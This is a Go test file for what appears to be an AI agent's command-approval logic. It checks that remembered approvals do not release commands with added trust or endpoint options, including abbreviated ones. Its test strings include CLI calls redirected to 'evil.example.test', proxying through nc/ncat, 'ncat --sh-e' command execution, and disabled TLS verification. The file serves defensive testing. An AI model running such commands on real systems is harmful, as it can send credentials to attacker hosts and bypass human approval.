package tools

import "testing"

// Trust and endpoint options change whom a call trusts or what it reaches: a
// CA bundle, TLS verification turned off, another endpoint or server, a proxy,
// a credential or configuration file. None may ride on a class remembered
// without them: `aws … --profile=cw3 --ca-bundle ./x.pem` derived the cw3
// class, so a remembered cw3 grant released it.
func TestTrustAndEndpointOptionsDropTheClass(t *testing.T) {
	scope := ExecutionScope{WorkspaceID: "ws-trust", WorkspaceRoot: "/work/trust"}
	for _, command := range []string{
		"aws codebuild batch-get-builds --ids b --profile=cw3 --ca-bundle ./x.pem",
		"aws codebuild batch-get-builds --ids b --profile cw3 --no-verify-ssl",
		"kubectl get pods --insecure-skip-tls-verify",
		"kubectl get pods --tls-server-name evil.example.test",
		"helm list --kube-insecure-skip-tls-verify",
		"helm list --kube-tls-server-name evil.example.test",
		"helm pull chart --repo https://evil.example.test",
		"helm show chart x --repo https://evil.example.test",
		"docker inspect web --tls",
		"docker inspect web --tlsverify=false",
		"podman inspect web --remote",
		"podman inspect web -r",
		"argocd app list --insecure",
		"argocd app list --plaintext",
		"argocd app list --core",
		"doctl compute droplet list --api-url https://evil.example.test",
		"flyctl status -c ./other.toml",
		"aliyun ecs DescribeInstances --endpoint evil.example.test",
		"aliyun ecs DescribeInstances --skip-secure-verify",
		"gcloud builds list --flags-file ./flags.yaml",
		"rsync --password-file ./pw src/ host::mod/",
		"ncat --proxy evil.example.test:8080 example.test 80",
		"nc -x evil.example.test:1080 example.test 80",
		"ssh -P staging build.example.test uptime",
		"scp -D ./sftp-server a host:b",
	} {
		for _, mode := range []SandboxMode{SandboxIsolated, SandboxHost} {
			if key := approvalPatternKeyForScope("terminal", classArgs(command, mode), "", scope, true); key != "" {
				t.Errorf("%q (%s) minted class key %q", command, mode, key)
			}
		}
		if rule, ok := approvalCommandPrefix("terminal", classArgs(command, SandboxIsolated)); ok {
			t.Errorf("%q offered prefix rule %q", command, rule)
		}
	}
	// The constraint that must change the result: the same calls without the
	// option keep their class.
	for _, command := range []string{
		"aws codebuild batch-get-builds --ids b --profile=cw3",
		"kubectl get pods",
		"helm list",
		"helm show chart x",
		"docker inspect web",
		"podman inspect web",
		"argocd app list",
		"doctl compute droplet list",
		"gcloud builds list",
	} {
		if key := approvalPatternKeyForScope("terminal", classArgs(command, SandboxIsolated), "", scope, true); key == "" {
			t.Errorf("%q lost its class", command)
		}
	}
}

// argparse (aws, az, gcloud), Python's getopt (gsutil) and getopt_long (ncat,
// netcat) read a long option from any unique prefix of its name, so
// `--endpoint-ur` is --endpoint-url. A prefix is read as every option it could
// name: one that could name a class-dropping option drops the class, and one
// that names a single bound selector binds as it.
func TestAbbreviatedSelectorsReadAsTheOptionsTheyName(t *testing.T) {
	scope := ExecutionScope{WorkspaceID: "ws-abbrev", WorkspaceRoot: "/work/abbrev"}
	for _, command := range []string{
		"aws codebuild batch-get-builds --ids b --endpoint-ur http://evil.example.test",
		"aws codebuild batch-get-builds --ids b --endpoint=http://evil.example.test",
		"aws codebuild batch-get-builds --ids b --profile=cw3 --ca-b ./x.pem",
		"aws codebuild batch-get-builds --ids b --no-verify",
		"gcloud builds list --impersonate sa@example.iam.gserviceaccount.com",
		"gcloud builds list --access-tok ./tok",
		// --account or --access-token-file: either may be read.
		"gcloud builds list --a ops@example.com",
		"gcloud builds list --acc ops@example.com",
		"ncat --sh-e id example.test 80",
	} {
		for _, mode := range []SandboxMode{SandboxIsolated, SandboxHost} {
			if key := approvalPatternKeyForScope("terminal", classArgs(command, mode), "", scope, true); key != "" {
				t.Errorf("%q (%s) minted class key %q", command, mode, key)
			}
		}
		if rule, ok := approvalCommandPrefix("terminal", classArgs(command, SandboxIsolated)); ok {
			t.Errorf("%q offered prefix rule %q", command, rule)
		}
	}
	for _, tc := range []struct{ command, class string }{
		{"aws codebuild batch-get-builds --ids b --prof cw3", "aws codebuild batch-get-builds --profile=cw3"},
		{"aws codebuild batch-get-builds --ids b --pro=cw3", "aws codebuild batch-get-builds --profile=cw3"},
		{"gcloud builds list --accou ops@example.com", "gcloud builds list --account=ops@example.com"},
		{"az vm list --subs prod", "az vm list --subscription=prod"},
	} {
		if prefix, ok := grantClassOf(tc.command); !ok || grantPrefixLabel(prefix) != tc.class {
			t.Errorf("%q: class %q (%v), want %q", tc.command, grantPrefixLabel(prefix), ok, tc.class)
		}
	}
	// The constraint that must change the result: a parser that reads only
	// exact names (cobra and pflag) never reads a selector as a longer one, so
	// kubectl's --user is the bound user, not --username.
	if prefix, ok := grantClassOf("kubectl get pods --user ops"); !ok || grantPrefixLabel(prefix) != "kubectl get --user=ops" {
		t.Errorf("kubectl --user: class %q (%v)", grantPrefixLabel(prefix), ok)
	}
}

// End to end: a remembered bare class does not release the same read pointed
// at another endpoint through an abbreviation.
func TestRememberedClassNeverReleasesAnAbbreviatedRedirect(t *testing.T) {
	asks := &classAsks{}
	person, _ := classKeyScope(t, ApprovalOnRequest, asks)
	if ran, _ := runClassKeyCall(person, "aws codebuild batch-get-builds --ids b"); !ran {
		t.Fatal("first call must run after the ask")
	}
	for _, command := range []string{
		"aws codebuild batch-get-builds --ids b --endpoint-ur http://evil.example.test",
		"aws codebuild batch-get-builds --ids b --no-verify-ssl",
	} {
		before := len(asks.requests)
		_, _ = runClassKeyCall(person, command)
		if len(asks.requests) != before+1 {
			t.Errorf("%q was released by the remembered bare class", command)
		}
	}
}
